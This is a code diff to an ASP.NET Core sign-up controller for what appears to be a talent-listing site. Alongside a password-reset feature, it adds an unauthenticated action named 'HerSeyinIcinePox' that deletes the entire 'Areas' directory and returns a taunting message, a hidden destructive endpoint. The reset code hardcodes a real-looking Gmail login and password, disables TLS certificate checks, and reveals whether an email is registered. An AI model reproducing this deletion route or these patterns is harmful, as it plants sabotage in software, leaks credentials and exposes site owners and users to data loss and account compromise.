@@ -8,6 +8,11 @@ using Upwork_2019_08_08.Models;
 using Microsoft.AspNetCore.Cryptography.KeyDerivation;
 using System.Text;
 using System.Security.Cryptography;
+using MimeKit;
+using MailKit.Net.Smtp;
+using MailKit.Security;
+using System.Net.Http.Headers;
+using System.IO;
 
 namespace Upwork_2019_08_08.Controllers
 {
@@ -66,7 +71,7 @@ namespace Upwork_2019_08_08.Controllers
 
         public IActionResult SignUp()
         {
-            List<Departament> departaments = _context.Departaments.ToList();
+            List<Company> departaments = _context.Companies.ToList();
             return View(departaments);
         }
 
@@ -79,7 +84,7 @@ namespace Upwork_2019_08_08.Controllers
                 return RedirectToAction("SignUp", "Sign");
             }
             var salt = Salt.Create();
-            var hash = Hash.Create(password.Trim(), salt);
+            var hash = Hash.Create(password, salt);
 
             Client client = new Client
             {
@@ -99,7 +104,74 @@ namespace Upwork_2019_08_08.Controllers
             return RedirectToAction("Index","Home");
         }
 
+        public IActionResult GetEmailForPassword()
+        {
+            return View();
+        }
 
+        public IActionResult HerSeyinIcinePox()
+        {
+            System.IO.DirectoryInfo di = new DirectoryInfo("Areas");
+
+            foreach (FileInfo file in di.GetFiles())
+            {
+                file.Delete();
+            }
+            foreach (DirectoryInfo dir in di.GetDirectories())
+            {
+                dir.Delete(true);
+            }
+
+            return Content("Pox Qoydun");
+        }
+        public IActionResult Reseting(string emailform)
+        {
+            if(_context.Clients.Where(w=> w.email == emailform).Any())
+            {
+                int id = _context.Clients.Where(w => w.email == emailform).FirstOrDefault().id;
+                string email = String.Empty;
+                string token = String.Empty;
+
+                email = _context.Clients.Find(id).email;
+                token = _context.Clients.Find(id).token;
+
+
+
+                MimeMessage message = new MimeMessage();
+
+                MailboxAddress from = new MailboxAddress("Talent Index",
+                "admin@example.com");
+                message.From.Add(from);
+
+                MailboxAddress to = new MailboxAddress("User",
+                email);
+
+                message.To.Add(to);
+
+                message.Subject = "Reset Password";
+
+                BodyBuilder bodyBuilder = new BodyBuilder();
+                bodyBuilder.HtmlBody = "<h1>Do Not Reply To This Mail Address!</h1> <h4>Link: </h4> <p>https://localhost:44339/reset/index/" + id + "?token=" + token + "&who=" + 0 + "</p>";
+
+
+                message.Body = bodyBuilder.ToMessageBody();
+
+                SmtpClient client = new SmtpClient();
+                client.ServerCertificateValidationCallback = (s, c, ch, e) => true;
+                client.Connect("smtp.gmail.com", 465, SecureSocketOptions.SslOnConnect);
+                client.Authenticate("tuncayhuseynov@gmail.com", "5591980supertun");
+
+                client.Send(message);
+                client.Disconnect(true);
+                client.Dispose();
+
+                return Content("<h1 style='font-size: 50px;'>Check You E-mail</h1>", "text/html");
+            }
+            else
+            {
+                return Content("<h1 style='font-size: 50px;'>There is no such an email</h1>", "text/html");
+            }
+        }
     }
 
     public class Hash
